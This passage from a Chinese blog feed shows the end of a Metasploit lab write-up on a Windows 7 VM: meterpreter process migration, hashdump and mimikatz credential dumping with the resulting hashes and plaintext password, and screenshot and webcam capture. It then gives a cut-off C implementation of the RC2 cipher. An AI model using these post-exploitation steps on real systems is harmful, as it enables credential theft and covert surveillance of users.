Tools\vmacthlp.exe</span><br><span class="line"> 728   512   svchost.exe             x64   0        NT AUTHORITY\NETWORK SERVICE</span><br><span class="line"> 780   512   svchost.exe             x64   0        NT AUTHORITY\LOCAL SERVICE</span><br><span class="line"> 896   512   svchost.exe             x64   0        NT AUTHORITY\SYSTEM</span><br><span class="line"> 960   2584  mscorsvw.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v2.0.50727\mscorsvw.exe</span><br><span class="line"> 964   512   svchost.exe             x64   0        NT AUTHORITY\SYSTEM</span><br><span class="line"> 1096  512   svchost.exe             x64   0        NT AUTHORITY\NETWORK SERVICE</span><br><span class="line"> 1192  512   spoolsv.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe</span><br><span class="line"> 1228  512   svchost.exe             x64   0        NT AUTHORITY\LOCAL SERVICE</span><br><span class="line"> 1240  512   svchost.exe             x64   0        NT AUTHORITY\SYSTEM</span><br><span class="line"> 1300  512   msdtc.exe               x64   0        NT AUTHORITY\NETWORK SERVICE</span><br><span class="line"> 1440  512   VGAuthService.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe</span><br><span class="line"> 1464  512   vmtoolsd.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\vmtoolsd.exe</span><br><span class="line"> 1624  512   sppsvc.exe              x64   0        NT AUTHORITY\NETWORK SERVICE</span><br><span class="line"> 1704  512   svchost.exe             x64   0        NT AUTHORITY\LOCAL SERVICE</span><br><span class="line"> 1744  512   mscorsvw.exe            x86   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework\v2.0.50727\mscorsvw.exe</span><br><span class="line"> 1768  512   svchost.exe             x64   0        NT AUTHORITY\NETWORK SERVICE</span><br><span class="line"> 1836  352   conhost.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe</span><br><span class="line"> 1844  512   dllhost.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\dllhost.exe</span><br><span class="line"> 1860  632   WmiPrvSE.exe</span><br><span class="line"> 1984  512   dllhost.exe             x64   0        NT AUTHORITY\SYSTEM</span><br><span class="line"> 2000  512   svchost.exe             x64   0        NT AUTHORITY\LOCAL SERVICE</span><br><span class="line"> 2084  512   VSSVC.exe               x64   0        NT AUTHORITY\SYSTEM</span><br><span class="line"> 2116  2424  cmd.exe                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe</span><br><span class="line"> 2192  2116  powershell.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</span><br><span class="line"> 2228  632   WmiPrvSE.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wbem\WmiPrvSE.exe</span><br><span class="line"> 2320  512   taskhost.exe            x64   1        WIN-Q1ST6EBNLTR\victim        C:\Windows\System32\taskhost.exe</span><br><span class="line"> 2368  352   conhost.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe</span><br><span class="line"> 2392  896   dwm.exe                 x64   1        WIN-Q1ST6EBNLTR\victim        C:\Windows\System32\dwm.exe</span><br><span class="line"> 2404  2384  explorer.exe            x64   1        WIN-Q1ST6EBNLTR\victim        C:\Windows\explorer.exe</span><br><span class="line"> 2424  1192  cmd.exe                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe</span><br><span class="line"> 2516  512   svchost.exe             x64   0        NT AUTHORITY\SYSTEM</span><br><span class="line"> 2548  512   WmiApSrv.exe            x64   0        NT AUTHORITY\SYSTEM</span><br><span class="line"> 2584  512   mscorsvw.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v2.0.50727\mscorsvw.exe</span><br><span class="line"> 2756  512   SearchIndexer.exe       x64   0        NT AUTHORITY\SYSTEM</span><br><span class="line"> 2852  2756  SearchFilterHost.exe    x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchFilterHost.exe</span><br><span class="line"> 2888  2756  SearchProtocolHost.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchProtocolHost.exe</span><br><span class="line"> 2968  2404  cmd.exe                 x64   1        WIN-Q1ST6EBNLTR\victim        C:\Windows\System32\cmd.exe</span><br><span class="line"> 2976  416   conhost.exe             x64   1        WIN-Q1ST6EBNLTR\victim        C:\Windows\System32\conhost.exe</span><br><span class="line"> 3060  3020  powershell.exe          x86   0        NT AUTHORITY\SYSTEM           C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe</span><br><span class="line"></span><br><span class="line">meterpreter &gt; migrate 2368</span><br><span class="line">[*] Migrating from 3060 to 2368...</span><br><span class="line">[*] Migration completed successfully.</span><br><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : WIN-Q1ST6EBNLTR</span><br><span class="line">OS              : Windows 7 (Build 7601, Service Pack 1).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : WORKGROUP</span><br><span class="line">Logged On Users : 2</span><br><span class="line">Meterpreter     : x64/windows</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure><h3 id="获取用户密码"><a href="#获取用户密码" class="headerlink" title="获取用户密码"></a>获取用户密码</h3><p>利用 hashdump 可以获得所有用户密码的哈希值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run hashdump</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.</span><br><span class="line">[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]</span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY a648199744904bf08ff1b92b5b224011...</span><br><span class="line">/usr/share/metasploit-framework/lib/rex/script/base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Obtaining the user list and keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">/usr/share/metasploit-framework/lib/rex/script/base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/usr/share/metasploit-framework/lib/rex/script/base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/usr/share/metasploit-framework/lib/rex/script/base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Dumping password hints...</span><br><span class="line"></span><br><span class="line">No users with password hints on this system</span><br><span class="line"></span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">victim:1000:aad3b435b51404eeaad3b435b51404ee:3008c87294511142799dca1191e69a0f:::</span><br><span class="line">hacker:1001:aad3b435b51404eeaad3b435b51404ee:5e7599f673df11d5c5c4d950f5bf0157:::</span><br></pre></td></tr></table></figure><p>使用神器 mimikatz 有可能能得到密码的明文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">Loading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7 (Build 7601, Service Pack 1).). Did you mean to &apos;load kiwi&apos; instead?</span><br><span class="line">Success.</span><br><span class="line">meterpreter &gt; wdigest</span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Retrieving wdigest credentials</span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">AuthID    Package    Domain           User              Password</span><br><span class="line">------    -------    ------           ----              --------</span><br><span class="line">0;997     Negotiate  NT AUTHORITY     LOCAL SERVICE</span><br><span class="line">0;996     Negotiate  WORKGROUP        WIN-Q1ST6EBNLTR$</span><br><span class="line">0;52252   NTLM</span><br><span class="line">0;999     NTLM       WORKGROUP        WIN-Q1ST6EBNLTR$</span><br><span class="line">0;333800  NTLM       WIN-Q1ST6EBNLTR  victim            admin123</span><br><span class="line">0;333754  NTLM       WIN-Q1ST6EBNLTR  victim            admin123</span><br></pre></td></tr></table></figure><h3 id="截取屏幕"><a href="#截取屏幕" class="headerlink" title="截取屏幕"></a>截取屏幕</h3><p>使用 screenshot 可以截取桌面实时图片：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; screenshot</span><br><span class="line">Screenshot saved to: /root/NjEXrhqY.jpeg</span><br></pre></td></tr></table></figure><p><img src="/pics/Have-Fun-with-Metasploit-Framework/2.png" alt="屏幕截图"></p><h3 id="用摄像头拍照"><a href="#用摄像头拍照" class="headerlink" title="用摄像头拍照"></a>用摄像头拍照</h3><p>使用 webcam 系列命令可以用摄像头拍照：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; webcam_list</span><br><span class="line">1: VMware Virtual USB Video Device</span><br><span class="line">meterpreter &gt; webcam_snap</span><br><span class="line">[*] Starting...</span><br><span class="line">[+] Got frame</span><br><span class="line">[*] Stopped</span><br><span class="line">Webcam shot saved to: /root/jkhYoacC.jpeg</span><br></pre></td></tr></table></figure><p><img src="/pics/Have-Fun-with-Metasploit-Framework/3.png" alt="摄像头拍照"></p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://blog.51cto.com/chenxinjie/2092754" target="_blank" rel="noopener">https://blog.51cto.com/chenxinjie/2092754</a><br><a href="https://mp.weixin.qq.com/s/swR4LjNJgHsx2VetyM6G5Q" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/swR4LjNJgHsx2VetyM6G5Q</a><br><a href="https://www.anquanke.com/post/id/164525" target="_blank" rel="noopener">https://www.anquanke.com/post/id/164525</a><br><a href="https://zhuanlan.zhihu.com/p/25857679" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/25857679</a><br><a href="https://xz.aliyun.com/t/2536" target="_blank" rel="noopener">https://xz.aliyun.com/t/2536</a><br><a href="http://hardsec.net/mimikatz-meterpreter-extension/?lang=en" target="_blank" rel="noopener">http://hardsec.net/mimikatz-meterpreter-extension/?lang=en</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;使用 Metasploit-Framework 复现 EternalBlue 以及 BlueKeep。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="cve" scheme="https://qianfei11.github.io/tags/cve/"/>
    
      <category term="kali" scheme="https://qianfei11.github.io/tags/kali/"/>
    
  </entry>
  
  <entry>
    <title>C语言实现RC2、RC5、RC6加密解密算法</title>
    <link href="https://qianfei11.github.io/2019/09/03/C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0RC2%E3%80%81RC5%E3%80%81RC6%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/"/>
    <id>https://qianfei11.github.io/2019/09/03/C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0RC2%E3%80%81RC5%E3%80%81RC6%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/</id>
    <published>2019-09-03T05:38:28.000Z</published>
    <updated>2019-09-06T09:17:29.717Z</updated>
    
    <content type="html"><![CDATA[<p>RC 算法是由 Ron Rivest 发明的一系列对称密钥加密算法。虽然这一系列的算法名字相似，但实际上算法之间没有太大的关联。</p><a id="more"></a><h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p>现在总共有六个 RC 系列的算法。其中 RC1 从来没有发布过，RC3 在开始使用前就被证明是不安全的。余下的都是现如今有所运用的算法。</p><ol><li>RC2 是一个于 1987 年发布的 64 位分组加密算法。</li><li>RC4 是当今运用最广泛的序列密码。我在<a href="https://qianfei11.github.io/2018/05/13/C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0RC4%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/">之前的文章</a>中实现过。</li><li>RC5 是一个于 1994 年发布的 32/64/128 位分组加密算法。</li><li>RC6 是一个于 1997 年发布的基于 RC5 的 128 位分组加密算法，在当年 AES 的评选中曾是 AES 决赛算法。</li></ol><p>了解过算法的基本知识后，下面是 RC2、RC5 以及 RC6 在 C 语言下的实现。</p><h1 id="RC2"><a href="#RC2" class="headerlink" title="RC2"></a><a href="https://en.wikipedia.org/wiki/RC2" target="_blank" rel="noopener">RC2</a></h1><p>RC2 是一种分组密码，和 DES 很像，它的输入和输出的长度都是 64 位，而密钥是可变的，长度范围是从 1 到 128 比特，目前使用的是 8 比特的密钥。RC2 被设计成能够在 16 位处理器上运行。在 IBM AT 上它能够比 DES 的加密速度快一倍（假设在完成密钥扩展的情况下）。</p><p>RC2 总共分为三个算法步骤。分别是密钥扩展、加密、解密。</p><p><img src="/pics/C语言实现RC2、RC5、RC6加密解密算法/rc2.png" alt="RC2 加密算法"></p><h2 id="密钥扩展算法"><a href="#密钥扩展算法" class="headerlink" title="密钥扩展算法"></a>密钥扩展算法</h2><p>密钥扩展通过一个长度变化的密钥生成 64 个字数组。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc2_keygen</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">short</span> xkey[<span class="number">64</span>], <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *key, <span class="keyword">unsigned</span> len, <span class="keyword">unsigned</span> bits)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> x;</span><br><span class="line">    <span class="keyword">unsigned</span> i;</span><br><span class="line">    <span class="comment">/* 256-entry permutation table, probably derived somehow from pi */</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> PITABLE[<span class="number">256</span>] = &#123;<span class="number">0xD9</span>, <span class="number">0x78</span>, <span class="number">0xF9</span>, <span class="number">0xC4</span>, <span class="number">0x19</span>, <span class="number">0xDD</span>, <span class="number">0xB5</span>, <span class="number">0xED</span>, <span class="number">0x28</span>, <span class="number">0xE9</span>, <span class="number">0xFD</span>, <span class="number">0x79</span>, <span class="number">0x4A</span>, <span class="number">0xA0</span>, <span class="number">0xD8</span>, <span class="number">0x9D</span>, <span class="number">0xC6</span>, <span class="number">0x7E</span>, <span class="number">0x37</span>, <span class="number">0x83</span>, <span class="number">0x2B</span>, <span class="number">0x76</span>, <span class="number">0x53</span>, <span class="number">0x8E</span>, <span class="number">0x62</span>, <span class="number">0x4C</span>, <span class="number">0x64</span>, <span class="number">0x88</span>, <span class="number">0x44</span>, <span class="number">0x8B</span>, <span class="number">0xFB</span>, <span class="number">0xA2</span>, <span class="number">0x17</span>, <span class="number">0x9A</span>, <span class="number">0x59</span>, <span class="number">0xF5</span>, <span class="number">0x87</span>, <span class="number">0xB3</span>, <span class="number">0x4F</span>, <span class="number">0x13</span>, <span class="number">0x61</span>, <span class="number">0x45</span>, <span class="number">0x6D</span>, <span class="number">0x8D</span>, <span class="number">0x09</span>, <span class="number">0x81</span>, <span class="number">0x7D</span>, <span class="number">0x32</span>, <span class="number">0xBD</span>, <span class="number">0x8F</span>, <span class="number">0x40</span>, <span class="number">0xEB</span>, <span class="number">0x86</span>, <span class="number">0xB7</span>, <span class="number">0x7B</span>, <span class="number">0x0B</span>, <span class="number">0xF0</span>, <span class="number">0x95</span>, <span class="number">0x21</span>, <span class="number">0x22</span>, <span class="number">0x5C</span>, <span class="number">0x6B</span>, <span class="number">0x4E</span>, <span class="number">0x82</span>, <span class="number">0x54</span>, <span class="number">0xD6</span>, <span class="number">0x65</span>, <span class="number">0x93</span>, <span class="number">0xCE</span>, <span class="number">0x60</span>, <span class="number">0xB2</span>, <span class="number">0x1C</span>, <span class="number">0x73</span>, <span class="number">0x56</span>, <span class="number">0xC0</span>, <span class="number">0x14</span>, <span class="number">0xA7</span>, <span class="number">0x8C</span>, <span class="number">0xF1</span>, <span class="number">0xDC</span>, <span class="number">0x12</span>, <span class="number">0x75</span>, <span class="number">0xCA</span>, <span class="number">0x1F</span>, <span class="number">0x3B</span>, <span class="number">0xBE</span>, <span class="number">0xE4</span>, <span class="number">0xD1</span>, <span class="number">0x42</span>, <span class="number">0x3D</span>, <span class="number">0xD4</span>, <span class="number">0x30</span>, <span class="number">0xA3</span>, <span class="number">0x3C</span>, <span class="number">0xB6</span>, <span class="number">0x26</span>, <span class="number">0x6F</span>, <span class="number">0xBF</span>, <span class="number">0x0E</span>, <span class="number">0xDA</span>, <span class="number">0x46</span>, <span class="number">0x69</span>, <span class="number">0x07</span>, <span class="number">0x57</span>, <span class="number">0x27</span>, <span class="number">0xF2</span>, <span class="number">0x1D</span>, <span class="number">0x9B</span>, <span class="number">0xBC</span>, <span class="number">0x94</span>, <span class="number">0x43</span>, <span class="number">0x03</span>, <span class="number">0xF8</span>, <span class="number">0x11</span>, <span class="number">0xC7</span>, <span class="number">0xF6</span>, <span class="number">0x90</span>, <span class="number">0xEF</span>, <span class="number">0x3E</span>, <span class="number">0xE7</span>, <span class="number">0x06</span>, <span class="number">0xC3</span>, <span class="number">0xD5</span>, <span class="number">0x2F</span>, <span class="number">0xC8</span>, <span class="number">0x66</span>, <span class="number">0x1E</span>, <span class="number">0xD7</span>, <span class="number">0x08</span>, <span class="number">0xE8</span>, <span class="number">0xEA</span>, <span class="number">0xDE</span>, <span class="number">0x80</span>, <span class="number">0x52</span>, <span class="number">0xEE</span>, <span class="number">0xF7</span>, <span class="number">0x84</span>, <span class="number">0xAA</span>, <span class="number">0x72</span>, <span class="number">0xAC</span>, <span class="number">0x35</span>, <span class="number">0x4D</span>, <span class="number">0x6A</span>, <span class="number">0x2A</span>, <span class="number">0x96</span>, <span class="number">0x1A</span>, <span class="number">0xD2</span>, <span class="number">0x71</span>, <span class="number">0x5A</span>, <span class="number">0x15</span>, <span class="number">0x49</span>, <span class="number">0x74</span>, <span class="number">0x4B</span>, <span class="number">0x9F</span>, <span class="number">0xD0</span>, <span class="number">0x5E</span>, <span class="number">0x04</span>, <span class="number">0x18</span>, <span class="number">0xA4</span>, <span class="number">0xEC</span>, <span class="number">0xC2</span>, <span class="number">0xE0</span>, <span class="number">0x41</span>, <span class="number">0x6E</span>, <span class="number">0x0F</span>, <span class="number">0x51</span>, <span class="number">0xCB</span>, <span class="number">0xCC</span>, <span class="number">0x24</span>, <span class="number">0x91</span>, <span class="number">0xAF</span>, <span class="number">0x50</span>, <span class="number">0xA1</span>, <span class="number">0xF4</span>, <span class="number">0x70</span>, <span class="number">0x39</span>, <span class="number">0x99</span>, <span class="number">0x7C</span>, <span class="number">0x3A</span>, <span class="number">0x85</span>, <span class="number">0x23</span>, <span class="number">0xB8</span>, <span class="number">0xB4</span>, <span class="number">0x7A</span>, <span class="number">0xFC</span>, <span class="number">0x02</span>, <span class="number">0x36</span>, <span class="number">0x5B</span>, <span class="number">0x25</span>, <span class="number">0x55</span>, <span class="number">0x97</span>, <span class="number">0x31</span>, <span class="number">0x2D</span>, <span class="number">0x5D</span>, <span class="number">0xFA</span>, <span class="number">0x98</span>, <span class="number">0xE3</span>, <span class="number">0x8A</span>, <span class="number">0x92</span>, <span class="number">0xAE</span>, <span class="number">0x05</span>, <span class="number">0xDF</span>, <span class="number">0x29</span>, <span class="number">0x10</span>, <span class="number">0x67</span>, <span class="number">0x6C</span>, <span class="number">0xBA</span>, <span class="number">0xC9</span>, <span class="number">0xD3</span>, <span class="number">0x00</span>, <span class="number">0xE6</span>, <span class="number">0xCF</span>, <span class="number">0xE1</span>, <span class="number">0x9E</span>, <span class="number">0xA8</span>, <span class="number">0x2C</span>, <span class="number">0x63</span>, <span class="number">0x16</span>, <span class="number">0x01</span>, <span class="number">0x3F</span>, <span class="number">0x58</span>, <span class="number">0xE2</span>, <span class="number">0x89</span>, <span class="number">0xA9</span>, <span class="number">0x0D</span>, <span class="number">0x38</span>, <span class="number">0x34</span>, <span class="number">0x1B</span>, <span class="number">0xAB</span>, <span class="number">0x33</span>, <span class="number">0xFF</span>, <span class="number">0xB0</span>, <span class="number">0xBB</span>, <span class="number">0x48</span>, <span class="number">0x0C</span>, <span class="number">0x5F</span>, <span class="number">0xB9</span>, <span class="number">0xB1</span>, <span class="number">0xCD</span>, <span class="number">0x2E</span>, <span class="number">0xC5</span>, <span class="number">0xF3</span>, <span class="number">0xDB</span>, <span class="number">0x47</span>, <span class="number">0xE5</span>, <span class="number">0xA5</span>, <span class="number">0x9C</span>, <span class="number">0x77</span>, <span class="number">0x0A</span>, <span class="number">0xA6</span>, <span class="number">0x20</span>, <span class="number">0x68</span>, <span class="number">0xFE</span>, <span class="number">0x7F</span>, <span class="number">0xC1</span>, <span class="number">0xAD</span>&#125;;</span><br><span class="line"></span><br><span class="line">    assert(len &gt; <span class="number">0</span> &amp;&amp; len &lt;= <span class="number">128</span>);</span><br><span class="line">    assert(bits &lt;= <span class="number">1024</span>);</span><br><span class="line">    <span class="keyword">if</span> (!bits)</span><br><span class="line">        bits = <span class="number">1024</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(xkey, key, len);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Phase 1: Expand input key to 128 bytes */</span></span><br><span class="line">    <span class="comment">// for i = T, T+1, ..., 127 do</span></span><br><span class="line">    <span class="comment">//     L[i] = PITABLE[L[i-1] + L[i-T]];</span></span><br><span class="line">    <span class="keyword">if</span> (len &lt; <span class="number">128</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        i = <span class="number">0</span>;</span><br><span class="line">        x = ((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)xkey)[len - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            x = PITABLE[(x + ((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)xkey)[i++]) &amp; <span class="number">255</span>];</span><br><span class="line">            ((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)xkey)[len++] = x;</span><br><span class="line">        &#125; <span class="keyword">while</span> (len &lt; <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Phase 2 - reduce effective key size to "bits" */</span></span><br><span class="line">    <span class="comment">// L[128-T8] = PITABLE[L[128-T8] &amp; TM];</span></span><br><span class="line">    len = (bits + <span class="number">7</span>) &gt;&gt; <span class="number">3</span>; <span class="comment">// bits = T1, len = T8, T8 = (T1+7)/8;</span></span><br><span class="line">    i = <span class="number">128</span> - len;</span><br><span class="line">    x = PITABLE[((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)xkey)[i] &amp; (<span class="number">255</span> &gt;&gt; (<span class="number">7</span> &amp; -bits))]; <span class="comment">// (255 &gt;&gt; (7 &amp; -bits) = TM, TM = 255 MOD 2^(8 + T1 - 8*T8);</span></span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)xkey)[i] = x;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// for i = 127-T8, ..., 0 do</span></span><br><span class="line">    <span class="comment">//     L[i] = PITABLE[L[i+1] XOR L[i+T8]];</span></span><br><span class="line">    <span class="keyword">while</span> (i--)</span><br><span class="line">    &#123;</span><br><span class="line">        x = PITABLE[x ^ ((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)xkey)[i + len]];</span><br><span class="line">        ((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)xkey)[i] = x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Phase 3 - copy to xkey in little-endian order */</span></span><br><span class="line">    i = <span class="number">63</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        xkey[i] = ((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)xkey)[<span class="number">2</span> * i] +</span><br><span class="line">                  (((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)xkey)[<span class="number">2</span> * i + <span class="number">1</span>] &lt;&lt; <span class="number">8</span>);</span><br><span class="line">    &#125; <span class="keyword">while</span> (i--);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="加密算法"><a href="#加密算法" class="headerlink" title="加密算法"></a>加密算法</h2><p>加密操作将一组 64 比特的字存入 4 个字中再进行加密。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc2_encrypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">short</span> xkey[<span class="number">64</span>], <span class="keyword">unsigned</span> <span class="keyword">char</span> *plain, <span class="keyword">unsigned</span> <span class="keyword">char</span> *cipher)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// xkey = K, plain = R</span></span><br><span class="line">    <span class="keyword">unsigned</span> x76, x54, x32, x10, i;</span><br><span class="line"></span><br><span class="line">    x76 = (plain[<span class="number">7</span>] &lt;&lt; <span class="number">8</span>) + plain[<span class="number">6</span>];</span><br><span class="line">    x54 = (plain[<span class="number">5</span>] &lt;&lt; <span class="number">8</span>) + plain[<span class="number">4</span>];</span><br><span class="line">    x32 = (plain[<span class="number">3</span>] &lt;&lt; <span class="number">8</span>) + plain[<span class="number">2</span>];</span><br><span class="line">    x10 = (plain[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>) + plain[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// R[i] = R[i] + K[j] + (R[i-1] &amp; R[i-2]) + ((~R[i-1]) &amp; R[i-3]);</span></span><br><span class="line">        <span class="comment">// j = j + 1;</span></span><br><span class="line">        <span class="comment">// R[i] = R[i] rol s[i];</span></span><br><span class="line">        x10 += (x32 &amp; ~x76) + (x54 &amp; x76) + xkey[<span class="number">4</span> * i + <span class="number">0</span>];</span><br><span class="line">        x10 = (x10 